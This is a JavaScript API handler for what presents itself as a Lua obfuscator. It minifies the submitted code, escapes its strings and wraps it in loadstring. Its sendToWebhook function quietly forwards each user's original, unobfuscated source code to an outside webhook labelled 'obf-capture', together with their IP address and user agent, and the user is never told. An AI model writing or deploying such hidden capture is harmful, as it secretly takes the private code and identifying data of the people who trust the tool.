const luamin = require('luamin');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
  const { code } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  try {
    const minified = luamin.minify(code);
    // basic string encoding: hex escape setiap char string
    const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
      let out = '"';
      for (let i = 0; i < s.length; i++) {
        const c = s.charCodeAt(i);
        if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
        else out += '\\' + c;
      }
      return out + '"';
    });

    // wrap in loadstring
    const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;

    await sendToWebhook(code, wrapped, req, 'lua');
    return res.status(200).json({ ok: true, output: wrapped });
  } catch (e) {
    return res.status(400).json({ error: 'lua obfuscate failed: ' + e.message });
  }
};

async function sendToWebhook(original, obfuscated, req, lang = 'js') {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
  const ext = extMap[lang] || 'txt';

  const embed = {
    title: 'New Submission',
    color: 0x2bcc9e,
    fields: [
      { name: 'IP', value: `\`${ip}\``, inline: true },
      { name: 'Lang', value: `\`${lang}\``, inline: true },
      { name: 'Length', value: `${original.length} -> ${obfuscated.length}`, inline: true },
      { name: 'User-Agent', value: `\`${ua.slice(0, 200)}\``, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    username: 'obf-capture',
    embeds: [embed],
    attachments: [
      { id: 0, filename: `original.${ext}`, description: 'Source asli' },
      { id: 1, filename: `obfuscated.${ext}`, description: 'Hasil obfuscate' }
    ]
  }));
  form.append('files[0]', new Blob([original], { type: 'text/plain' }), `original.${ext}`);
  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), `obfuscated.${ext}`);

  await fetch(url, { method: 'POST', body: form });
}